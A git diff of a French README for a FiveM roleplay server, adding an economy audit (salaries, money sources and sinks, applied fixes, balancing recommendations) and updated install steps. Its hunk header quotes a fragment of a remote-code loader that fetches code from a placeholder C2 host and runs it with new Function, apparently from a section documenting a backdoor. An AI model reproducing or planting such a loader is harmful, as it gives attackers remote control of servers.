@@ -187,9 +187,78 @@ require('https').get('https://<C2>/…', res => { … new Function('global', cod
 
 ---
 
+## Économie
+
+> Audit économique réalisé le **2026-06-04**. Objectif : repérer les **générateurs d'argent** (injection), les **puits** (sinks), les items à 0 $, les salaires aberrants et les boucles de farm infini. Règle appliquée : **zéro suppression de feature** — on rééquilibre des valeurs, on ne retire pas de système.
+
+### Grille de référence (revenu net visé)
+| Catégorie | Cible /h | Remarque |
+|---|---|---|
+| Civil (jobs sociaux) | 500 – 1 500 $ | Récolte, livraison, bar… |
+| Légal (métiers d'État/spécialisés) | 2 000 – 4 000 $ | LEO, EMS, mécano, gouv |
+| Illégal (drogue, braquage) | 4 000 – 10 000 $ | Gated par police/cooldown |
+| Véhicules « S » (super) | 2 – 8 M$ | Prix d'achat (puits) |
+
+### Mécanique de paie (`Framework/server/paycheck.lua`)
+- Cycle **toutes les 45 min** (`Config.PaycheckInterval`). Pour convertir un salaire en taux horaire : `salaire × 1,333`.
+- **Point clé** : seuls les `unemployed` (RSA) sont payés **directement depuis la banque** = **véritable injection monétaire**. Tous les autres métiers sont payés depuis le **compte société** (`RemoveSocietyMoney` → `addAccountMoney`) = **transfert** auto-limité par les fonds de la société, pas de la création monétaire.
+- Multiplicateur VIP : **×1,5 (Gold)** / **×2 (Diamond)** sur le salaire. Légitime (avantage payant), mais double l'effet sur les sociétés subventionnées.
+
+### Salaires (table `job_grades` — install.sql)
+| Métier | Catégorie | Salaire /45 min | ≈ /h | Verdict |
+|---|---|---|---|---|
+| `unemployed` (RSA) | injection directe | 100 | 133 | ✅ OK (aide sociale) |
+| `bahamas` (bar) | civil | 1 500 → 8 000 | 2 000 → 10 667 | ⚠️ Élevé vs civil (société-financé) |
+| `ambulance` | légal/État | 5 000 → 9 000 | 6 667 → 12 000 | ⚠️ Au-dessus, mais société d'État subventionnée |
+| `gouv` | légal/État | 5 000 → 9 500 | 6 667 → 12 667 | ⚠️ Idem (État) |
+| `roxsherif` | légal (LEO) | 800 → 3 500 | 1 067 → 4 667 | ✅ Quasi conforme |
+| `mecano` / `mecano2` | légal | 400 → 5 000 | 533 → 6 667 | ✅ Cohérent (boss = pic) |
+| `cardealer` | commission | 1 → **9999** | — | ❌ **Aberrant** (corrigé) |
+
+> Les salaires non-`unemployed` étant des **transferts société**, ils ne « créent » pas d'argent : ils vident la société (qui doit donc avoir une activité génératrice). C'est pourquoi seuls les écarts manifestes sont corrigés ; les paies d'État élevées relèvent d'une **décision owner** (subvention des sociétés étatiques).
+
+### Sources d'injection monétaire (audit terrain)
+| Activité | Fichier | Montant | Cooldown / frein | Risque |
+|---|---|---|---|---|
+| AFK Investment (ROI +50 %) | `Kays/game/afk/shared/svafk_config.lua` | profit 1 389 – 3 333 $/h **passif** | capital bloqué 2–64 h | ⚠️ **Inflationniste** (passif > civil actif) |
+| Go-Fast | `…/modules/server/gofast/server.lua` | 50 – 80 k$ (dirtycash) | 12 h / joueur | ✅ OK |
+| Braquage banque (Casa/Pacifique) | `…/server/braquage/main.lua` | 400 – 900 k$ (dirtycash) | 10 min + 5 LEO | 🟠 Cooldown court pour le montant |
+| Bijouterie | `…/server/braquage/main.lua` | ~25 k$/run (dirtycash) | 2 h | ✅ OK |
+| Vente drogue (territoires) | `[Shyroz]/…/Territories/server/server.lua:264` | 490 – 650 $/unité, **consomme l'item** | friction PNJ | ✅ Conversion (pas un printer), mais payé en **cash propre** |
+| Pêche / Boucherie | `Kays/game/peche`, `…/boucherie` | 125 – 350 $ / 190 – 310 $ | inventaire + position | ✅ Civil OK |
+| Auto-event (ramassage) | `…/server/autoevent/server.lua` | 500 – 1 300 $ | 1 h | ✅ OK |
+| Caisses mystère | `Shop/shared/sv_config.lua`, `MysteryCase` | jusqu'à 5 M$ | **monnaie premium** (points Tebex, `tebex_players_wallet`) | ✅ Hors économie in-game (achat réel) |
+
+### Puits (sinks) — sains
+- **Concessionnaire** (`vehicles` SQL) : super **85 k → 3,5 M$**, sports jusqu'à 1,25 M$. Cohérent avec la grille « S 2–8 M$ ». ✅
+- **Boutique VIP** (`Shop`) : véhicules 1 000 – 6 000 en **monnaie premium**, pas en $ in-game. ✅
+- Carwash, achats d'armes territoire, loyers propriétés. ✅
+
+### ✅ Corrections appliquées (cette passe)
+| Élément | Avant → Après | Fichier |
+|---|---|---|
+| Salaire `cardealer` boss | `9999 → 1000` (métier à commission, aligné sur `cardealer2`) | `install.sql` (`job_grades` id 1642) |
+| Intégrité SQL : table `KoyCase` manquante | ajoutée (`citizenid`, `goldcoin`, `silvercoin`) | `install.sql` |
+
+> Aucun **item à 0 $ exploitable** trouvé : les `price = 0` / `prix = 0` sont des **armureries LEO** (Gamemode/config, `Bjobs/lsco`, `sasp`) — non revendables, légitimes. Aucune **boucle de farm infini** : les zones de récolte (`craftui/configfarm.lua`) produisent des **items** ; la revente **consomme** ces items (pas de création ex nihilo).
+
+### 🔧 Recommandations (décision owner — non appliquées)
+1. **AFK Investment** : un ROI **garanti +50 %** sans risque rend le revenu **passif** supérieur au civil **actif** (jusqu'à 3 333 $/h vs 500–1 500 $/h). Comme c'est une feature annoncée (« afkfarm »), suggestion conservatrice : ramener le ROI à **+20/25 %** (ex. palier 1 : `15000 → 12000`) pour passer sous le plafond civil.
+2. **Vente drogue territoires** : payée en **`cash` propre** → pas de blanchiment requis. Envisager `dirtycash` pour cohérence avec les autres revenus illégaux.
+3. **Braquage banque** : cooldown **10 min** pour 400–900 k$ est court ; envisager 20–30 min, ou conditionner au nombre de LEO.
+4. **Salaires d'État** (ambulance/gouv) au-dessus de la grille légale : à conserver **uniquement** si les sociétés étatiques sont alimentées par une recette (amendes, subvention admin) ; sinon réduire vers 2 000–4 000 $/h.
+5. **Sécurité** : webhooks Discord **en clair** dans `xCardealer/config.lua:16` et `MysteryCase/server/main.lua` → **à régénérer** (une URL de webhook est un secret).
+
+### Intégrité SQL
+- Vérification `FROM`/`INSERT`/`UPDATE`/`DELETE` du code Lua vs `CREATE TABLE` de `install.sql`.
+- Manquante détectée et **ajoutée** : `KoyCase` (rédemption de code, `MysteryCase/server/main.lua:571`).
+- `eInvest`, `KoyCase_codes`, `tebex_players_wallet`, `tebex_fidelite` : présentes ✅. `lgd_idcard` : **non requise** (références entièrement commentées).
+
+---
+
 ## Installation
 
-1. **Base de données** : créer une base MySQL (ex. `wise`) puis importer `sql.sql`.
+1. **Base de données** : créer une base MySQL (ex. `noxa`) puis importer `install.sql` (**seul** fichier SQL ; `sql.sql` a été supprimé).
 2. **Connexion** : adapter `mysql_connection_string` dans `server.cfg` à votre base (ne pas versionner ce secret).
 3. **Clés** : renseigner votre **propre** `sv_licenseKey` (keymaster Cfx), `steam_webApiKey` et webhooks Discord.
 4. **Ressources** : placer le dossier dans `resources/` et garder `exec "resources.cfg"` dans `server.cfg`.
